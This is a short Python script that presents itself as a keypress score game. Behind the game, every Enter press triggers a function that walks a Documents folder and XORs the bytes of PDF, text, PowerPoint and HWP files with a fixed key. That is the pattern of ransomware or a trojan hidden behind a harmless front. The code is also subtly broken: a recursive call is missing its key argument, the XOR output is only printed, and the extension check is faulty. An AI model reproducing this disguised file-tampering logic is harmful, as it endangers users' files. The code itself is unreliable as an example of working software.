import os
import sys

score = 0

def game():
	global score
	click = sys.stdin.read(1)
	try:
		if ord(click) == 10:
			score += 1
			print("Score : %d\n"%score)
			return 1
		else :
			score -= 1
			print("Score : %d\n"%score)
			return 0
	except:
		print("ERROR : Click\n")
		return 0

def search(dirname,key):
	filekinds = ['.pdf','.txt','.ppt','hwp']
	filenames = os.listdir(dirname)
	try:
		for filename in filenames:
			full_filename = os.path.join(dirname, filename)
			if os.path.isdir(full_filename):
					search(full_filename)
			else :
				ext = os.path.splitext(full_filename)[-1]
				if ext in filekinds : 
					f = open(full_filename,'rb')
					while True:
						data = f.read(32)
						for i in data:
 							output = int(i) ^ int(key)

						#key=bytes(key)
						#print(type(key))
						#output = int(data.decode())^int(key.decode())
						print(output)
						if not data:
							break

	except PermissionError:
		print("ERROR : Permission\n")

if __name__ == '__main__':
	print("Score : %d\n"%score)
	while score<30:
		if game() == 1:
			search("Y:\Documents\\test\\",31337)

